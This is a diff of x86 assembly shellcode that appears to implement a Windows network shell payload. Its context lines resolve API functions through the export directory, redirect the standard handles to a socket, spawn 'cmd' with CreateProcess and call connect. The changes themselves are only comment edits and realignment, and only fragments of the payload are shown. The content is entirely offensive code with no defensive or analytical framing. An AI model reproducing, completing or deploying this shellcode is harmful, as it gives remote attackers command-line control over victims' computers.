@@ -74,7 +74,7 @@ get_dll:
       ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
       mov    ecx, [ebx+eax+78h]
       jecxz  next_dll
-      ; esi = hash_dll(IMAGE_EXPORT_DIRECTORY.Name)
+      ; esi = IMAGE_EXPORT_DIRECTORY.Name
       mov    esi, [ebx+ecx+0ch]
       add    esi, ebx
       xor    eax, eax
@@ -155,15 +155,15 @@ init_api_disp:
       stosd                 ; si.hStdError  = s;
       cdq      
       push   edi            ; lpProcessInformation = &pi
-      push   ebx            ; lpStartupInfo = &si      
-      push   edx            ; lpCurrentDirectory = NULL
-      push   edx            ; lpEnvironment = NULL
-      push   edx            ; dwCreationFlags = 0
-      push   eax            ; bInheritHandles = TRUE
-      push   edx            ; lpThreadAttributes = NULL
-      push   edx            ; lpProcessAttributes = NULL
-      push   esi            ; lpCommandLine = "cmd", 0
-      push   edx            ; lpApplicationName = NULL
+      push   ebx            ; lpStartupInfo        = &si      
+      push   edx            ; lpCurrentDirectory   = NULL
+      push   edx            ; lpEnvironment        = NULL
+      push   edx            ; dwCreationFlags      = 0
+      push   eax            ; bInheritHandles      = TRUE
+      push   edx            ; lpThreadAttributes   = NULL
+      push   edx            ; lpProcessAttributes  = NULL
+      push   esi            ; lpCommandLine        = "cmd", 0
+      push   edx            ; lpApplicationName    = NULL
       xchg   ebx, eax
       lodsd
       ; connect(s, &sa, sizeof(sa));
